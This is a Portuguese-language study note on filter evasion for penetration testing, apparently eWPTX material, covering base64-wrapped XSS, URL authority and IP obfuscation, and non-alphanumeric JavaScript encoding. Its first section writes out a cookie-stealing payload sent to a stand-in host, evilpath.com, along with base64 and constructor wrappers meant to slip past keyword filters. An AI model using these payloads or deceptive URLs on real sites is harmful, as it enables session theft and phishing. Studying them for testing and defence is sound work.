# Base64 Encoding Evasion

A maioria dos sistemas de detecção utilizam o regex para encontrar palavras maliciosas. Imaginando que quero evadir de um sistema que procura pelas palavras: eval, alert, prompt, document.cookie

Normalmente se usa:
```JavaScript
location.href = 'http://evilpath.com/?c='+escape(document.cookie)
```

Ele não vai funcionar por causa do "document.cookie", uma alternativa seria:
```JavaScript
eval(atob("bG9jYXRpb24uaHJlZiA9ICdodHRwOi8vZXZpbHBhdGguY29tLz9jPScrZXNjYXBlKGRvY3VtZW50LmNvb2tpZSk="))
```

Para esse exemplo também não vai funcionar por causa do "eval", outra possibilidade seria:
```JavaScript
[].constructor.constructor(atob("bG9jYXRpb24uaHJlZiA9ICdodHRwOi8vZXZpbHBhdGguY29tLz9jPScrZXNjYXBlKGRvY3VtZW50LmNvb2tpZSk="))()
```

Outros métodos válidos:
```JavaScript
setTimeout("code")    # Todos os navegadores
setInterval("code")   # Todos os navegadores
setImmediate("code")  # IE 10+
Function("code")()    # Todos os navegadores
```
# URI Obfuscation Techiques

Utilizado principalmente para engenharia social, mas também pode ser usado em alguma situação que seja necessário ocultar a url, dar bypass em algum sistema ou diminuir o tamanho do payload
## URL Shortening

Utilizado para encurtar a url, pode-se usar soluções prontas ou criar a sua própria solução

https://yourls.org/  -> Solução Open Source <br>
https://bitly.com/   -> Solução paga

*colocando um '+' ao fim da url encurtada pelo bitly, é possível descobrir mais informações sobre o verdadeiro link*

Outra forma de descobrir o link verdadeiro é realizando um cURL e analisando o header "Location" na resposta
## URL Hostname Obfuscation

Referência para estudo \[RFC 3986]: https://datatracker.ietf.org/doc/html/rfc3986#page-16
### URL Authority Obfuscation

**Obfuscating with Userinfo**

Estrutura da URI segundo a rfc:
```
foo://example.com:8042/over/there?name=ferret#nose
\_/ \________________/\_________/ \_________/ \__/
 |           |             |           |       |
scheme   authority        path       query  fragment
```

O componente Authority pode ter a seguinte estrutura:
```
[ userinfo "@" ] host [ ":" port ]
```

O campo "userinfo" é usado para autenticação em aplicações, seguindo esse exemplo:
```
http://user:pass@o-site-para-autenticar.com.br
```

Quando o site não possui autenticação esse campo é ignorado. Isso permite usar esse campo para ofuscar informações, criando urls como a seguinte:
```
http://www.google.com@hack.me/xss
```

É possível usar caracteres unicode para deixar a url ainda mais convincente

![](https://github.com/SQU4NCH/eWPTX-Study-Notes/blob/main/Imagens/Pasted%20image%2020231226160208.png)

*Navegadores como o Firefox e o Opera, avisam o usuário final do redirecionamento. Já o Chrome não avisa nada*

**Obfuscating with Host**

Um site pode ser acessado tanto por seu endereço DNS como por seu endereço IP, e esse endereço IP pode estar em diferentes formatos, como por exemplo, Dword, Hexadecimal, Octal

Como exemplo, o Google pode ser acessado usando os seguintes endereços:
```
http://google.com
http://216.58.215.78           # IP
http://3627734862              # DWORD
http://0330.0072.0327.0116     # OCTAL
http://0xd83ad74e              # HEXADECIMAL
http://0xd8.0x3a.0xd7.0x4e     # HEXADECIMAL (separado por número)
```

Também é possível criar um endereço híbrido, mesclando dois ou mais formatos

Ferramenta para ajudar na conversão de formatos:

https://www.silisoftware.com/tools/ipconverter.php

# JavaScript Obfuscation Techiques

Existe várias formas de realizar encoding com JavaScript, uma das formas mais interessantes é utilizando uma técnica chamada "Non-alphanumeric". Basicamente essa técnica consiste em utilizar encodes com caracteres não alfa numéricos
## String Casting

No JavaScript é possível criar variáveis da seguinte forma:
```JavaScript
"" + 1234 or 1234 + ""  // Retorna "1234"
[] + 1234 or 1234 + []  // Retorna "1234"

x = "hello"
[1,"a",x]              // Retorna [1, "a", "hello"]
[1,"a",x]+""           // Retorna "1,a,hello"
```

**Booleans**

| False | True |
| --- | --- |
| !\[] | !!\[] |
| !{} | !!{} |
| !!"" | !"" |
| \[]\=={} | \[]\=="" |

Por exemplo, para retornar a string "true" ou "false", pode-se usar os exemplos acima
```JavaScript
[!![]]+""     // Retorna "true"
[![]]+""      // Retorna "false"
```

Também é possível criar números, por exemplo, o 0 pode ser criado da seguinte forma:
```Javascript
+""
-""
-+-+""
+[]
-[]
-+-+[]
![]+![]
![]+!{}
![]+!!""
```

True é igual a 1, False é igual a 0. Com isso é possível gerar o número 1 usando TRUE+FALSE e 2 usando TRUE+TRUE

| Number | Non-alphanumeric representations |
| ---- | ---- |
| 0 | +\[] , +"" , !\[]+!\[] |
| 1 | +!!\[] , !\[]+!"" , !\[]+!!\[] , ~\[]\*~\[] , ++\[\[]]\[+\[]] |
| 2 | !!\[]+!!\[] , ++\[++\[\[]]\[+\[]]]\[+\[]] |
| 3 | !!\[]+!!\[]+!!\[] |
| 4 | !!\[]+!!\[]+!!\[]+!!\[] , (!!\[]+!!\[])\*(!!\[]+!!\[]) |
| 5 | !!\[]+!!\[]+!!\[]+!!\[]+!!\[] |
### Generate 'alert' string

Para gerar uma palavra é preciso usar um output nativo do JavaScript e extrair o caractere desejado. por exemplo:
```JavaScript
_={}+[]      // é "[object Object]"
[]/[]+""     // é "NaN"
!![]/![]+""  // é "Infinity"
```

Então, para extrair p caractere "a" podemos usar o NaN e acessar a posição 1

```JavaScript
([]/[]+"")[![]+!![]]    // "a"
\________/\________/
     |         |
   "NaN"       1
```

O restante pode ser gerado usando as seguintes mensagens:

| | |
| ---- | ---- |
| l | fa**L**se |
| e | tru**E**, fals**E** ou \[obj**E**ct Obj**E**ct] |
| r | t**R**ue |
| t | **T**rue ou infini**T**y |

Existem algumas ferramentas baseadas nessas técnicas

https://utf-8.jp/public/jjencode.html <br>
https://utf-8.jp/public/aaencode.html <br>
https://jsfuck.com
## JavaScript Compressing

**Minifying**

O processo de "minifying" no código JavaScript consiste em remover todos os caracteres desnecessários do código sem alterar a funcionalidade original. Basicamente todos os caracteres que são utilizados para deixar o código mais legível são removidos. 

https://developers.google.com/closure/compiler/ <br>
https://yui.github.io/yuicompressor/  <br>
https://www.crockford.com/jsmin.html <br>
http://dean.edwards.name/packer/ 

**Packing**

O "packing" comprime o código gerado com o minifying encurtando os nomes de variáveis, funções e outras operações. A ideia é deixar o código ilegível

http://dean.edwards.name/packer/
